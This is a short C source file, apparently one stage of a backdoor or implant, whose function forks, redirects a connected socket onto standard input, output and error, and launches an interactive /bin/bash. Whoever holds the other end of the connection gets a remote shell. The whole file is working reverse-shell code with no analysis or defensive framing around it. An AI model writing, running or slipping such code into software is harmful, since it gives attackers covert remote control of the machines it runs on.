#include "headers.h"
#include <stdio.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <sys/wait.h>

void redirection(int connID){
        printf("[*] stage 3\n");

        char buffer[1024] ={0};
        char *output;
        char *input;
        int RUN = 1;
        
        char *ok = "starting the RS";
        safeSend(connID, ok);
        //send(connID, ok, strlen(ok),0);
        
        int fdIN = dup(STDIN_FILENO);
        int fdOUT = dup(STDOUT_FILENO);
        int fdERR = dup(STDERR_FILENO);
        
        pid_t pid = fork();
        if(pid == 0){
        
            dup2(connID, 0);
            dup2(connID, 1);
            dup2(connID, 2);
            
            char *argv[] = {"/bin/bash", "-i", NULL};
            execve("/bin/bash", argv, NULL);
                
            char *e = "failed starting the RS";
            safeSend(connID, e);
            //send(connID, e, strlen(e),0);
                
        }
        else{
        
            dup2(fdIN, STDIN_FILENO);
            dup2(fdOUT, STDOUT_FILENO);
            dup2(fdERR, STDERR_FILENO);
            
            int status;
            waitpid(pid, &status, 0);
            
            printf("rs closed");
            
            char *m = "rs closed";
            safeSend(connID, m);
            //send(connID, m, strlen(m),0);
            
            
        }
}
